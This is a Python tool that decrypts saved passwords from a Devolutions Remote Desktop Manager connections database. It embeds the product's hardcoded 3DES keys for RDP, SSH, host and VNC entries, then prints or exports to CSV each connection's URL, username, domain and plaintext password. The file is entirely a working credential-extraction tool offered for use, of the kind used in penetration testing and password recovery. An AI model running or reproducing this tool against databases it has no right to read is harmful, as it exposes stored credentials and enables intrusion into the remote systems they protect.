#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Copyright 2022, Photubias <@tijldeneut>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
'''
Decrypting Stored Passwords in Devolutions Remote Desktop Manager
The connections DB can be found in this location (default, but can be anywhere)
%localappdata%\Devolutions\RemoteDesktopManagerFree
'''
import optparse, os, sys, sqlite3, xml.dom.minidom, base64, re
from Crypto.Cipher import DES3

sRDPKey = '7e3aae8f0f93945cfc6dc9952c66c87f'
sSSHKey = 'a2ad48052935e0a4267e7093a4729845'
sHostKey = '36841b0915f1c9dac6f2cfbe3100948f'
sVNCKey = '84d9128026a77dd3a102b64326bbbb7f'

def decryptCredential(sData, sType):
    bData = base64.b64decode(sData)
    if sType == 'RDPConfigured': bKey = bytes.fromhex(sRDPKey)
    elif sType == 'SSHShell': bKey = bytes.fromhex(sSSHKey)
    elif sType == 'Host': bKey = bytes.fromhex(sHostKey)
    else: bKey = bytes.fromhex(sVNCKey)
    oCipher =  DES3.new(bKey, DES3.MODE_ECB)
    return re.sub(b'[\0-\x0F]', b'', oCipher.decrypt(bData)).decode(errors='ignore')
        
if __name__ == '__main__':
    """Utility core."""
    usage = (
        'usage: %prog [options] credentialdb\n\n'
        'Decrypting credentials from Devolutions Remote Desktop Manager\n'
        'Only the built-in encryption data source is currently supported\n'
        'Sqlite3 DB file typically found in:\n'
        '%localappdata%\\Devolutions\\RemoteDesktopManagerFree\\Connections.db')

    parser = optparse.OptionParser(usage=usage)
    parser.add_option('--export', '-e', metavar='STRING', dest='export', default='', help='Optional CSV file')
    
    (options, args) = parser.parse_args()

    if len(args) == 0: sys.exit('[-] Error: please provide Credential Database')
    if not os.path.isfile(args[0]): sys.exit('[-] Error: file {} not found'.format(args[0]))
    
    if options.export: 
        oFile = open(options.export, 'w')
        oFile.write('Connection;URL;Owner;Protocol;Username;Domain;Password\n')
    oConn = sqlite3.connect(args[0])
    oCursor = oConn.execute("SELECT DATA from Connections")
    iCount = 0
    for oRow in oCursor:
        sXML = oRow[0]
        oDoc = xml.dom.minidom.parseString(sXML)
        for oConn in oDoc.getElementsByTagName('Connection'):
            sName = oConn.getElementsByTagName('Name')[0].firstChild.data 
            if sName == '[Root]': break
            sType = oConn.getElementsByTagName('ConnectionType')[0].firstChild.data 
            iCount += 1
            sURL = ''
            if len(oConn.getElementsByTagName('Url')): sURL = oConn.getElementsByTagName('Url')[0].firstChild.data
            elif len(oConn.getElementsByTagName('Host')): sURL = oConn.getElementsByTagName('Host')[0].firstChild.data
            sCreatedBy = oConn.getElementsByTagName('CreatedBy')[0].firstChild.data
            
            sProtocol = ''
            if sType == 'RDPConfigured': sProtocol = 'RDP'
            elif sType == 'SSHShell': sProtocol = 'Terminal'
            elif sType == 'Host': sProtocol = 'HostDetails'
            elif sType == 'VNC': sProtocol = 'VNC'
            else: print('[-] Connection key not reversed yet; buy me a coffee and I\'ll fix it :-)')

            sUsername = sPassword = sDomain = ''
            if sProtocol: 
                oElement = oConn.getElementsByTagName(sProtocol)[0]
                if len(oElement.getElementsByTagName('Domain')) > 0: sDomain = oElement.getElementsByTagName('Domain')[0].firstChild.data   
                if len(oElement.getElementsByTagName('UserName')) > 0: sUsername = oElement.getElementsByTagName('UserName')[0].firstChild.data
                elif len(oElement.getElementsByTagName('Username')) > 0: sUsername = oElement.getElementsByTagName('Username')[0].firstChild.data
                if len(oElement.getElementsByTagName('SafePassword')) > 0: sPassword = decryptCredential(oElement.getElementsByTagName('SafePassword')[0].firstChild.data, sType)
            print('[+] Found connection: {}\n    URL:        {}\n    Created by: {}\n    Protocol:   {}\n    Username:   {}\n    Domain:     {}\n    Password:   {}'.format(sName, sURL, sCreatedBy, sProtocol, sUsername, sDomain, sPassword))
            if options.export: oFile.write('{};{};{};{};{};{};{}\n'.format(sName, sURL, sCreatedBy, sProtocol, sUsername, sDomain, sPassword))
    
    if iCount > 0: print('\n[+] Done decoding {} connections.'.format(iCount))
    if options.export: oFile.close()
